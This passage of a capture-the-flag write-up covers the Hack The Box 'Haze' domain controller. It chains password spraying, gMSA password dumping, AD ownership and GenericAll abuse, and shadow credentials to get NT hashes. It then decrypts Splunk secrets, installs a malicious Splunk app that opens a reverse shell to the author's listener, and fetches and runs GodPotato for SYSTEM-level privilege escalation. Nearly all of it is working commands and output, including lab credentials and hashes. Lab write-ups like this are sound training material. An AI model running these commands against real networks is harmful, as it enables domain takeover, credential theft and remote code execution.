+SMB         10.129.11.223   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.11.223   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+SMB         10.129.11.223   445    DC01             [*] Enumerated shares
+SMB         10.129.11.223   445    DC01             Share           Permissions     Remark
+SMB         10.129.11.223   445    DC01             -----           -----------     ------
+SMB         10.129.11.223   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.11.223   445    DC01             C$                              Default share
+SMB         10.129.11.223   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.11.223   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.11.223   445    DC01             SYSVOL          READ            Logon server share</code></pre><p>No interesting access on shares</p><h3>Users</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.haze.htb -u paul.taylor -p &#39;Ld@p_Auth_Sp1unk@2k24&#39; --rid-brute 20000
+SMB         10.129.11.223   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.11.223   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+SMB         10.129.11.223   445    DC01             498: HAZE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             500: HAZE\Administrator (SidTypeUser)
+SMB         10.129.11.223   445    DC01             501: HAZE\Guest (SidTypeUser)
+SMB         10.129.11.223   445    DC01             502: HAZE\krbtgt (SidTypeUser)
+SMB         10.129.11.223   445    DC01             512: HAZE\Domain Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             513: HAZE\Domain Users (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             514: HAZE\Domain Guests (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             515: HAZE\Domain Computers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             516: HAZE\Domain Controllers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             517: HAZE\Cert Publishers (SidTypeAlias)
+SMB         10.129.11.223   445    DC01             518: HAZE\Schema Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             519: HAZE\Enterprise Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             520: HAZE\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             521: HAZE\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             522: HAZE\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             525: HAZE\Protected Users (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             526: HAZE\Key Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             527: HAZE\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             553: HAZE\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.11.223   445    DC01             571: HAZE\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.11.223   445    DC01             572: HAZE\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.11.223   445    DC01             1000: HAZE\DC01$ (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1101: HAZE\DnsAdmins (SidTypeAlias)
+SMB         10.129.11.223   445    DC01             1102: HAZE\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1104: HAZE\mark.adams (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1105: HAZE\edward.martin (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1106: HAZE\alexander.green (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1107: HAZE\gMSA_Managers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             1108: HAZE\Splunk_Admins (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             1109: HAZE\Backup_Reviewers (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             1110: HAZE\Splunk_LDAP_Auth (SidTypeGroup)
+SMB         10.129.11.223   445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
+SMB         10.129.11.223   445    DC01             1112: HAZE\Support_Services (SidTypeGroup)</code></pre><p>I can adapt this command to write all the users from this output to a userfile</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.haze.htb -u paul.taylor -p &#39;Ld@p_Auth_Sp1unk@2k24&#39; --rid-brute 20000 | grep &#39;(SidTypeUser)&#39; | cut -d &#39;\&#39; -f 2 | cut -d &#39; &#39; -f 1 &gt; users.txt</code></pre><p>There are no kerberoastalbe users and none are AS-REP roastable</p><p>Now might be a good time to collect bloodhound data</p><h2>Password spray leads to user compromise</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc01.haze.htb -u paul.taylor -p &#39;Ld@p_Auth_Sp1unk@2k24&#39; --pass-pol                                    
+LDAP        10.129.11.223   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.11.223   389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [+] Dumping password info for domain: haze.htb
+LDAP        10.129.11.223   389    DC01             Minimum password length: 7
+LDAP        10.129.11.223   389    DC01             Password history length: 24
+LDAP        10.129.11.223   389    DC01             Maximum password age: 41 days 23 hours 52 minutes 
+LDAP        10.129.11.223   389    DC01             
+LDAP        10.129.11.223   389    DC01             Password Complexity Flags: 000001
+LDAP        10.129.11.223   389    DC01                 Domain Refuse Password Change: 0
+LDAP        10.129.11.223   389    DC01                 Domain Password Store Cleartext: 0
+LDAP        10.129.11.223   389    DC01                 Domain Password Lockout Admins: 0
+LDAP        10.129.11.223   389    DC01                 Domain Password No Clear Change: 0
+LDAP        10.129.11.223   389    DC01                 Domain Password No Anon Change: 0
+LDAP        10.129.11.223   389    DC01                 Domain Password Complex: 1
+LDAP        10.129.11.223   389    DC01             
+LDAP        10.129.11.223   389    DC01             Minimum password age: 23 hours 52 minutes 
+LDAP        10.129.11.223   389    DC01             Reset Account Lockout Counter: 30 minutes 
+LDAP        10.129.11.223   389    DC01             Locked Account Duration: 30 minutes 
+LDAP        10.129.11.223   389    DC01             Account Lockout Threshold: 0
+LDAP        10.129.11.223   389    DC01             Forced Log off Time: Not Set</code></pre><p>First ill check the lockout policy, its not set here so i dont have to worry</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc01.haze.htb -u users.txt -p &#39;Ld@p_Auth_Sp1unk@2k24&#39; --continue-on-success
+LDAP        10.129.11.223   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\Administrator:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\Guest:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\krbtgt:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\DC01$:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\edward.martin:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\alexander.green:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [-] haze.htb\Haze-IT-Backup$:Ld@p_Auth_Sp1unk@2k24</code></pre><p>As seen here i have now compromised the user <code>mark.adams</code></p><h2>Bloodhound</h2><p>Now ill collect bloodhound data since the next move is not obvious!</p><p><img src="images/haze/pasted-image-20260607185822.webp" alt="Screenshot" loading="lazy" /></p><p>This user is a part of remote management users, so i should be able to winrm</p><p>Also part of the GMSA managers group</p><p>Since this user is apart of the remote management users ill get a shell as the user and ill recollect data using sharphound.</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\mark.adams\Desktop&gt; .\SharpHound.exe -c all
+
+...[SNIP]...
+
+*Evil-WinRM* PS C:\Users\mark.adams\Desktop&gt; dir
+
+
+    Directory: C:\Users\mark.adams\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          6/7/2026   7:03 PM          41549 20260607190340_BloodHound.zip
+-a----          6/7/2026   7:03 PM           1595 NzBkNGM2ZWYtODFhYy00M2M0LTgzNzMtNmViNTQ1NzJhN2Nk.bin
+-a----          6/7/2026   7:02 PM        1351680 SharpHound.exe
+
+
+*Evil-WinRM* PS C:\Users\mark.adams\Desktop&gt; download 20260607190340_BloodHound.zip
+                                        
+Info: Downloading C:\Users\mark.adams\Desktop\20260607190340_BloodHound.zip to 20260607190340_BloodHound.zip
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Users\mark.adams\Desktop&gt;</code></pre><p>So after looking around on bloodhound i see no outbound object control that tells me i can get the GMSA</p><p>Ill try using bloodyAD to see if there is something i have to do first</p><h2>Dumping GMSA of the service account</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD -d haze.htb --host dc01.haze.htb -u mark.adams -p &#39;Ld@p_Auth_Sp1unk@2k24&#39; get writable 
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=haze,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Mark Adams,CN=Users,DC=haze,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Haze-IT-Backup,CN=Managed Service Accounts,DC=haze,DC=htb
+permission: WRITE
+
+distinguishedName: DC=haze.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=haze,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.haze.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=haze,DC=htb
+permission: CREATE_CHILD</code></pre><p>So i have write access on this, so i should be able to add the right to make it so i can read the NTLM</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\Users\mark.adams\Desktop&gt; Set-ADServiceAccount Haze-IT-Backup -PrincipalsAllowedToRetrieveManagedPassword &quot;mark.adams&quot;</code></pre><p>Now i should be able to dump it.</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc ldap dc01.haze.htb -u mark.adams -p &#39;Ld@p_Auth_Sp1unk@2k24&#39; --gmsa
+LDAP        10.129.11.223   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb) (signing:None) (channel binding:Never) 
+LDAP        10.129.11.223   389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.11.223   389    DC01             [*] Getting GMSA Passwords
+LDAP        10.129.11.223   389    DC01             Account: Haze-IT-Backup$      NTLM: 76da32697ff38bc7c9fa6289abf47940     PrincipalsAllowedToReadPassword: mark.adams</code></pre><p>Now i have the NTLM of the service account</p><p><img src="images/haze/pasted-image-20260607191842.webp" alt="Screenshot" loading="lazy" /></p><p>This account has WriteOwner over the support services group</p><p>So the next step is to grab a TGT for the <code>haze-it-backup$</code> account then grant ownership to myself over the group, then i can apply GenericAll to the group.</p><p>On second thought i think bloodyAD support pass the hash so i dont need a TGT.</p><p>But looking at the members of that group i see there arent any, this could be just something weird with this box, i had to rerun collection several times already so see what rights ive got.</p><h2>GenericAll on the support services group</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc01.haze.htb -d haze.htb -u &#39;Haze-IT-Backup$&#39; -p &#39;:76da32697ff38bc7c9fa6289abf47940&#39;  set owner Support_Services &#39;Haze-IT-Backup$&#39;
+[+] Old owner S-1-5-21-323145914-28650650-2368316563-512 is now replaced by Haze-IT-Backup$ on Support_Services</code></pre><p>Now i am the owner of the group</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc01.haze.htb -d haze.htb -u &#39;Haze-IT-Backup$&#39; -p &#39;:76da32697ff38bc7c9fa6289abf47940&#39; add genericAll &#39;support_services&#39; &#39;Haze-IT-Backup$&#39;
+[+] Haze-IT-Backup$ has now GenericAll on support_services</code></pre><p>Now i have GenericAll over the group!</p><p>So now ill re-collect bloodhound data, since i think there may be a member of support services i can use but for some reason i just cant see it.</p><p><img src="images/haze/pasted-image-20260608160843.webp" alt="Screenshot" loading="lazy" /></p><p>After re-collecting bloodhound data i see there is a user i can use. I have <code>ForceChangePassword</code> on <code>edward.martin</code> and also <code>AddKeyCredentialLink</code></p><p>So i have two options, i can either change the users password or i can abuse shadow credentials</p><h2>Compromising <code>edward.martin</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc01.haze.htb -d haze.htb -u &#39;haze-it-backup$&#39; -p &#39;:76da32697ff38bc7c9fa6289abf47940&#39; add groupMember &#39;Support_Services&#39; &#39;haze-it-backup$&#39;
+
+[+] haze-it-backup$ added to Support_Services</code></pre><p>Now ill add myself to the group itself</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">bloodyAD --host dc01.haze.htb -d haze.htb -u &#39;haze-it-backup$&#39; -p &#39;:76da32697ff38bc7c9fa6289abf47940&#39; set password &#39;edward.martin&#39; &#39;Password123!&#39;
+Traceback (most recent call last):
+  File &quot;/home/kali/.local/bin/bloodyAD&quot;, line 6, in &lt;module&gt;
+    sys.exit(main())
+             ~~~~^^
+  File &quot;/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py&quot;, line 342, in main
+    asyncio.run(amain())
+    ~~~~~~~~~~~^^^^^^^^^
+  File &quot;/usr/lib/python3.13/asyncio/runners.py&quot;, line 195, in run
+    return runner.run(main)
+           ~~~~~~~~~~^^^^^^
+  File &quot;/usr/lib/python3.13/asyncio/runners.py&quot;, line 118, in run
+    return self._loop.run_until_complete(task)
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
+  File &quot;/usr/lib/python3.13/asyncio/base_events.py&quot;, line 725, in run_until_complete
+    return future.result()
+           ~~~~~~~~~~~~~^^
+  File &quot;/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py&quot;, line 272, in amain
+    output = await result
+             ^^^^^^^^^^^^
+  File &quot;/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py&quot;, line 288, in password
+    raise e
+  File &quot;/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py&quot;, line 129, in password
+    await ldap.bloodymodify(target, {&quot;unicodePwd&quot;: op_list})
+  File &quot;/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py&quot;, line 336, in bloodymodify
+    raise err
+badldap.commons.exceptions.LDAPModifyException: 
+Password can&#39;t be changed before -1 day, 7:55:46.122722 because of the minimum password age policy.</code></pre><p>So i cannot abuse <code>ForceChangePassword</code> for some reason here</p><p>So ill have to abuse shadow credentials here</p><p><a href="https://www.hackingarticles.in/shadow-credentials-attack/" target="_blank" rel="noreferrer">https://www.hackingarticles.in/shadow-credentials-attack/</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">faketime -f +8h certipy-ad shadow auto -u &#39;haze-it-backup$@haze.htb&#39; -hashes &#39;:76da32697ff38bc7c9fa6289abf47940&#39; -account &#39;edward.martin&#39; -debug -dc-host dc01.haze.htb -dc-ip 10.129.12.135 -target dc01.haze.htb
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: &#39;10.129.12.135&#39;
+[+] DC IP: &#39;10.129.12.135&#39;
+[+] DC Host: &#39;dc01.haze.htb&#39;
+[+] Target IP: None
+[+] Remote Name: &#39;dc01.haze.htb&#39;
+[+] Domain: &#39;HAZE.HTB&#39;
+[+] Username: &#39;HAZE-IT-BACKUP$&#39;
+[+] Trying to resolve &#39;dc01.haze.htb&#39; at &#39;10.129.12.135&#39;
+[+] Authenticating to LDAP server using NTLM authentication
+[+] Using NTLM signing: False (LDAP signing: True, SSL: True)
+[+] Using channel binding signing: True (LDAP channel binding: True, SSL: True)
+[+] Using LDAP channel binding for NTLM authentication
+[+] LDAP NTLM authentication successful
+[+] Bound to ldaps://10.129.12.135:636 - ssl
+[+] Default path: DC=haze,DC=htb
+[+] Configuration path: CN=Configuration,DC=haze,DC=htb
+[*] Targeting user &#39;edward.martin&#39;
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID &#39;b5d7a68a63324a4498adef96fec68039&#39;
+[*] Adding Key Credential with device ID &#39;b5d7a68a63324a4498adef96fec68039&#39; to the Key Credentials for &#39;edward.martin&#39;
+[*] Successfully added Key Credential with device ID &#39;b5d7a68a63324a4498adef96fec68039&#39; to the Key Credentials for &#39;edward.martin&#39;
+[*] Authenticating as &#39;edward.martin&#39; with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: &#39;edward.martin@haze.htb&#39;
+[*] Trying to get TGT...
+[+] Sending AS-REQ to KDC haze.htb (10.129.12.135)
+[*] Got TGT
+[*] Saving credential cache to &#39;edward.martin.ccache&#39;
+[+] Attempting to write data to &#39;edward.martin.ccache&#39;
+[+] Data written to &#39;edward.martin.ccache&#39;
+[*] Wrote credential cache to &#39;edward.martin.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;edward.martin&#39;
+[*] Restoring the old Key Credentials for &#39;edward.martin&#39;
+[*] Successfully restored the old Key Credentials for &#39;edward.martin&#39;
+[*] NT hash for &#39;edward.martin&#39;: 09e0b3eeb2e7a6b0d419e9ff8f4d91af</code></pre><p>I now have the NT hash for the user <code>edward.martin</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb dc01.haze.htb -u edward.martin -H &#39;09e0b3eeb2e7a6b0d419e9ff8f4d91af&#39;                                                                    
+SMB         10.129.12.135   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.12.135   445    DC01             [+] haze.htb\edward.martin:09e0b3eeb2e7a6b0d419e9ff8f4d91af</code></pre><p>This user is now compromised</p><p><img src="images/haze/pasted-image-20260608163706.webp" alt="Screenshot" loading="lazy" /></p><p>This user is also part of the remote management users group and is also part of the group <code>backup_reviewers</code></p><h2>Access to the splunk portal as the administrator</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">*Evil-WinRM* PS C:\&gt; cd Backups
+*Evil-WinRM* PS C:\Backups&gt; dir
+
+
+    Directory: C:\Backups
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+d-----          3/5/2025  12:33 AM                Splunk
+
+
+*Evil-WinRM* PS C:\Backups&gt; cd Splunk
+*Evil-WinRM* PS C:\Backups\Splunk&gt; dir
+
+
+    Directory: C:\Backups\Splunk
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          8/6/2024   3:22 PM       27445566 splunk_backup_2024-08-06.zip
+
+
+*Evil-WinRM* PS C:\Backups\Splunk&gt; download splunk_backup_2024-08-06.zip
+                                        
+Info: Downloading C:\Backups\Splunk\splunk_backup_2024-08-06.zip to splunk_backup_2024-08-06.zip
+                                        
+Info: Download successful!
+*Evil-WinRM* PS C:\Backups\Splunk&gt;</code></pre><p>Found a splunk backup file that ill download to my machine.</p><p>Browsing to the path <code>/Splunk/etc/auth/splunk.secret</code> i find a different secret than what i found earlier.</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat splunk.secret 
+CgL8i4HvEen3cCYOYZDBkuATi5WQuORBw9g4zp4pv5mpMcMF3sWKtaCWTX8Kc1BK3pb9HR13oJqHpvYLUZ.gIJIuYZCA/YNwbbI4fDkbpGD.8yX/8VPVTG22V5G5rDxO5qNzXSQIz3NBtFE6oPhVLAVOJ0EgCYGjuk.fgspXYUc9F24Q6P/QGB/XP8sLZ2h00FQYRmxaSUTAroHHz8fYIsChsea7GBRaolimfQLD7yWGefscTbuXOMJOrzr/6B</code></pre><p>The secret i found earlier via LFI on the live application was for the hash in <code>etc/system/local/authentication.conf</code></p><p>But there were four more hashes in the splunk <code>/etc/passwd</code> file that i couldnt decrypt before, this secret may allow me to decrypt those hashes?</p><p>Also checking the <code>/etc/passwd</code> file in the zipped backup i find a different admin hash</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat passwd       
+:admin:$6$8FRibWS3pDNoVWHU$vTW2NYea7GiZoN0nE6asP6xQsec44MlcK2ZehY5RC4xeTAz4kVVcbCkQ9xBI2c7A8VPmajczPOBjcVgccXbr9/::Administrator:admin:changeme@example.com:::19934</code></pre><p>This hash is different from the one i found earlier</p><p>So after doing some research the hashes with the identifier <code>$7$</code> are more like encrpyted strings that can be reversed using the <code>splunk.secret</code> but the hashes with the identifier <code>$6$</code> use sha-512 hashing algorithm so the secret is useless for this new admin hash ive found.</p><p>The new hash doesnt crack so ill keep looking through the directory</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">grep -r &#39;bindDNpassword&#39;
+
+var/run/splunk/confsnapshot/baseline_local/system/local/authentication.conf:bindDNpassword = $1$YDz8WfhoCWmf6aTRkA+QqUI=</code></pre><p>Ill go into the root directory and look for any fields called <code>bindDNpassword</code> this was where i found the hash i had earlier in the live web application.</p><p>This is an older legacy splunk algorithm, once again i can use splunksecrets to decrpyt this</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">splunksecrets splunk-legacy-decrypt -S splunk.secret --ciphertext &#39;$1$YDz8WfhoCWmf6aTRkA+QqUI=&#39;
+Sp1unkadmin@2k24</code></pre><p>I now have this password, this was meant to be for the user alexander green but it doesnt work as domain credentials.</p><p><img src="images/haze/pasted-image-20260608171611.webp" alt="Screenshot" loading="lazy" /></p><p>I noe have access as the administrator.</p><h2>Domain admin</h2><h3>Shell as <code>alexander.green</code></h3><p><a href="https://github.com/0xjpuff/reverse_shell_splunk" target="_blank" rel="noreferrer">https://github.com/0xjpuff/reverse_shell_splunk</a></p><p>Ill use this repo to guide me to make a malicious application!</p><p>First ill clone the repo</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">git clone https://github.com/0xjpuff/reverse_shell_splunk</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cd reverse_shell_splunk</code></pre><p>Then ill move into the directory and make some slight changes</p><p>Ill modify <code>run.ps1</code> and add my IP address and the port ive chosen for the listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">rm rev.py</code></pre><p>Then ill remove the rev.py file since its for unix installs</p><p>Then finally ill modify <code>inputs.conf</code> to look like this:</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[script://.\bin\run.bat]
+disabled = 0
+sourcetype = pentest
+interval = 10</code></pre><p>Ive basically removed the section for <code>rev.py</code> since i dont need it</p><p>Then i can prep the archive</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">tar -cvzf reverse_shell_splunk.tgz reverse_shell_splunk
+mv reverse_shell_splunk.tgz shell.spl</code></pre><p>Now i can upload this by navigating to <code>Apps -&gt; Manage Apps</code> then i can install an app from file</p><p>Once the app uploads ill do a restart and a second later i get a shell!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 443
+[+] Listening for reverse shells on 0.0.0.0:443 -&gt; 127.0.0.1 • 192.168.1.157 • 10.10.15.69
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] =&gt; DC01 10.129.232.50 Microsoft_Windows_Server_2022_Standard-x64-based_PC 👤 haze\alexander.green 😍️ Session ID &lt;1&gt;
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/kali/.penelope/sessions/DC01~10.129.232.50-Microsoft_Windows_Server_2022_Standard-x64-based_PC/2026_06_08-18_52_13-373.log
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+PS C:\Windows\system32&gt; whoami
+haze\alexander.green
+PS C:\Windows\system32&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+PS C:\Windows\system32&gt;</code></pre><p>I also have <code>SeImpersonatePrivilege</code></p><p>So i can just upload GodPotato</p><h3>Uploading GodPotato</h3><p><a href="https://github.com/BeichenDream/GodPotato/releases" target="_blank" rel="noreferrer">https://github.com/BeichenDream/GodPotato/releases</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 4444
+Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\users\alexander.green\Documents&gt; wget http://10.10.15.69:4444/GodPotato-NET4.exe -o godpotato.exe
+PS C:\users\alexander.green\Documents&gt; dir
+
+
+    Directory: C:\users\alexander.green\Documents
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          6/8/2026   7:01 PM          57344 godpotato.exe                                                        
+
+
+PS C:\users\alexander.green\Documents&gt;</code></pre><p>Ill download it from github, then transfer it my machine using a python web server</p><p>Now all i need to do is run it!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\users\alexander.green\Documents&gt; .\godpotato.exe -cmd &quot;cmd /c net localgroup administrators paul.taylor /add&quot;
+[*] CombaseModule: 0x140716828131328
+[*] DispatchTable: 0x140716830722376
+[*] UseProtseqFunction: 0x140716830014272
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] Trigger RPCSS
+[*] CreateNamedPipe \\.\pipe\85681b04-065f-4c07-bd08-9c216bafb7e2\pipe\epmapper
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000b002-1464-ffff-4c01-5453e2e0a0ab
+[*] DCOM obj OXID: 0x556fb81f0db89e2
+[*] DCOM obj OID: 0xbe981b63a7f4d38d
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 936 Token:0x644  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 3548
+The command completed successfully.
+
+PS C:\users\alexander.green\Documents&gt; </code></pre><p>This command added the initial user i compromise <code>paul.taylor</code> to the administrators group.</p><p>Now if i login via evil-winrm i should have admin access.</p><h3>Domain admin</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i haze.htb -u paul.taylor -p &#39;Ld@p_Auth_Sp1unk@2k24&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\paul.taylor\Documents&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
